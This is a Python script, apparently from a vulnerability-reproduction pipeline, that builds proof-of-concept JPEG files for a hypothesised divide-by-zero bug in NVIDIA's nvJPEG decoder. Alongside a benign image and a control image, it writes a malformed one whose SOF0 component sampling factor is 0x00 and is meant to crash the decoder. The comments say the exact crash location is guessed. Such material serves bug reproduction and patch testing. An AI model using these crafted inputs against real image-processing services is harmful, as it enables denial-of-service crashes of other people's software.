# 假设：CVE-2026-65160 的除零发生在 nvJPEG 解析 JPEG SOF0 采样因子时。
# 具体地，组件采样因子字节被设为 0x00（水平 H=0，垂直 V=0），
# 使解码器计算 max_h_samp_factor/max_v_samp_factor 为 0，
# 随后在计算 MCU/块尺寸时执行类似
#   ceil(width * H / (max_h_samp_factor * 8))
# 的除法，分母为 0 触发 CWE-369。
# 恢复该字节为合法值 0x11（H=1,V=1）应使程序恢复正常。
# 不确定点：具体除零公式、触发位置（nvjpegGetImageInfo 或 nvjpegDecode）
# 未知；本脚本选择最经典的 JPEG 采样因子为 0 假设，并保持其余
# 熵编码数据为合法全零块。
import hashlib
import struct


def seg(marker, payload):
    return b'\xff' + bytes([marker]) + struct.pack('>H', len(payload) + 2) + payload


def build_jpeg(width, height, sampling_factor):
    out = bytearray()
    out += b'\xff\xd8'  # SOI

    # APP0 JFIF
    out += seg(0xE0, b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')

    # DQT: precision 0, table id 0, 64 entries all 1
    out += seg(0xDB, b'\x00' + bytes([1]) * 64)

    # SOF0: baseline, 8-bit, one component, sampling_factor parameter
    sof_payload = bytes([8]) + struct.pack('>HH', height, width) + bytes([1, 1, sampling_factor, 0])
    out += seg(0xC0, sof_payload)

    # DHT: standard DC luminance table (table 0) and AC luminance table (table 0)
    dc_bits = bytes([0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0])
    dc_vals = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B
    ])
    ac_bits = bytes([0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7D])
    ac_vals = bytes([
        0x01,0x02,0x03,0x00,0x04,0x11,0x05,0x12,
        0x21,0x31,0x41,0x06,0x13,0x51,0x61,0x07,
        0x22,0x71,0x14,0x32,0x81,0x91,0xA1,0x08,
        0x23,0x42,0xB1,0xC1,0x15,0x52,0xD1,0xF0,
        0x24,0x33,0x62,0x72,0x82,0x09,0x0A,0x16,
        0x17,0x18,0x19,0x1A,0x25,0x26,0x27,0x28,
        0x29,0x2A,0x34,0x35,0x36,0x37,0x38,0x39,
        0x3A,0x43,0x44,0x45,0x46,0x47,0x48,0x49,
        0x4A,0x53,0x54,0x55,0x56,0x57,0x58,0x59,
        0x5A,0x63,0x64,0x65,0x66,0x67,0x68,0x69,
        0x6A,0x73,0x74,0x75,0x76,0x77,0x78,0x79,
        0x7A,0x83,0x84,0x85,0x86,0x87,0x88,0x89,
        0x8A,0x92,0x93,0x94,0x95,0x96,0x97,0x98,
        0x99,0x9A,0xA2,0xA3,0xA4,0xA5,0xA6,0xA7,
        0xA8,0xA9,0xAA,0xB2,0xB3,0xB4,0xB5,0xB6,
        0xB7,0xB8,0xB9,0xBA,0xC2,0xC3,0xC4,0xC5,
        0xC6,0xC7,0xC8,0xC9,0xCA,0xD2,0xD3,0xD4,
        0xD5,0xD6,0xD7,0xD8,0xD9,0xDA,0xE1,0xE2,
        0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,0xEA,
        0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,
        0xF9,0xFA
    ])
    dht_payload = bytes([0x00]) + dc_bits + dc_vals + bytes([0x10]) + ac_bits + ac_vals
    out += seg(0xC4, dht_payload)

    # SOS: one component, DC/AC table 0, Ss=0, Se=63, Ah/Al=0
    out += seg(0xDA, bytes([1, 1, 0x00, 0, 63, 0]))

    # Entropy data: each 8x8 block is all-zero coefficients.
    # Standard DC category 0 code = 00, standard AC EOB code = 1010.
    bits = ''
    num_blocks = ((width + 7) // 8) * ((height + 7) // 8)
    for _ in range(num_blocks):
        bits += '00' + '1010'
    if len(bits) % 8:
        bits += '1' * (8 - (len(bits) % 8))

    entropy = bytearray()
    for i in range(0, len(bits), 8):
        b = int(bits[i:i + 8], 2)
        entropy.append(b)
        if b == 0xFF:
            entropy.append(0x00)
    out += entropy

    out += b'\xff\xd9'  # EOI
    return bytes(out)


def write_and_print(role, filename, data):
    with open(filename, 'wb') as f:
        f.write(data)
    digest = hashlib.sha256(data).hexdigest()
    print(f"[F15_FILE] {role} {filename} {len(data)} {digest}")


def main():
    print(
        "[F15_PLAN] divide-by-zero is assumed when SOF0 component sampling "
        "factor is 0x00 (H=0,V=0), making max_h/max_v_samp_factor zero and "
        "causing a division by max_samp_factor*8 in MCU/block dimension "
        "computation; restoring 0x11 should fix it."
    )

    benign = build_jpeg(64, 64, 0x11)
    poc = build_jpeg(64, 64, 0x00)
    ctrl = build_jpeg(64, 64, 0x11)

    write_and_print("benign", "benign_nvjpeg_sampling_11.jpg", benign)
    write_and_print("poc", "poc_nvjpeg_hsamp_zero.jpg", poc)
    write_and_print("ctrl", "ctrl_nvjpeg_sampling_11_restored.jpg", ctrl)


if __name__ == "__main__":
    main()